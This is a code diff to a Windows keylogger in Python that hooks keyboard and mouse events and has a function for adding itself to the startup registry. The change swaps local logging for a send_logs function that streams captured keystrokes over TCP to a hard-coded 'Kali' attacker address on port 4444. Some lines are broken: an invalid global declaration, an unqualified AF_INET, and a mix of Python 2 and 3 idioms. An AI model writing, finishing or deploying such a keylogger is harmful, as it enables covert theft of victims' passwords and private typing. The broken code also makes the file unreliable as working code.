@@ -5,17 +5,21 @@
 
 import sys
 import win32api, pythoncom
-import pyHook, os, time, random, smtplib, string, base64
+import pyHook, os, time, random, smtplib, string, base64, socket
 from _winreg import *
+
+KALI_PRIV_IP = '192.168.21.2'
+KALI_PORT = 4444
 
 global t = ""
 
-try: 
-    f = open('log.txt', 'a')
-    f.close()
-except:
-    f = open('log.txt', 'w')
-    f.close()
+def send_logs(data):
+    try: 
+        with socket.socket(AF_INET, socket.SOCK_STREAM) as client_socket:
+            client_socket.connect((KALI_PRIV_IP, KALI_PORT))
+            client_socket.sendall(data.encode('utf-8'))
+    except Exception as e:
+        print(f"Failed to send logs: {e}")
 
 def addStartup(): # add the file to startup registry key
     filepath = os.path.dirname(os.path.realpath(__file__))
@@ -43,9 +47,7 @@ def OnMouseEvent(event):
     global t
     t = t + data
     if len(t) > 500:
-        f = open('log.txt','a')
-        f.write(t)
-        f.close()
+        send_logs(t)
         t = ''
 
     return True
@@ -57,9 +59,7 @@ def OnKeybEvent(event):
     global t
     t = t + data
     if len(t) > 500:
-        f = open('log.txt','a')
-        f.write(t)
-        f.close()
+        send_logs(t)
         t = ''
     return True
 
